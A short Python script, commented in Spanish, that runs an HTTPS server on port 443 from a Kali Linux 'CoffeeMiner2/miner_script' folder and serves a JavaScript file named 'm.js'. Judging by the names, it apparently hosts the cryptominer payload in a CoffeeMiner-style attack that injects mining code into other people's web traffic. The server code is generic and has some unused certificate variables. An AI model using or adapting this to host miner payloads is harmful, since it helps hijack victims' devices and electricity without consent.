#!/usr/bin/env python
import http.server
import socketserver
import os
import ssl

PORT = 443

web_dir = os.path.join(os.path.dirname(__file__), '/home/kali/Desktop/CoffeeMiner2/miner_script/')
os.chdir(web_dir)

# Especifica el nombre del archivo JavaScript
js_file = 'm.js'

# La ruta completa al archivo JavaScript
js_path = os.path.join(web_dir, js_file)



certfile = '/home/kali/Desktop/CoffeeMiner2/cert.pem'
keyfile = '/home/kali/Desktop/CoffeeMiner2/key.pem'



Handler = http.server.SimpleHTTPRequestHandler

# Configura el contexto SSL y carga los certificados
context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile="/home/kali/Desktop/CoffeeMiner2/certificate.crt", keyfile="/home/kali/Desktop/CoffeeMiner2/private.key")

httpd = socketserver.TCPServer(("", PORT), Handler)
httpd.socket = context.wrap_socket(httpd.socket, server_side=True)

print("Serving at port", PORT)
httpd.serve_forever()
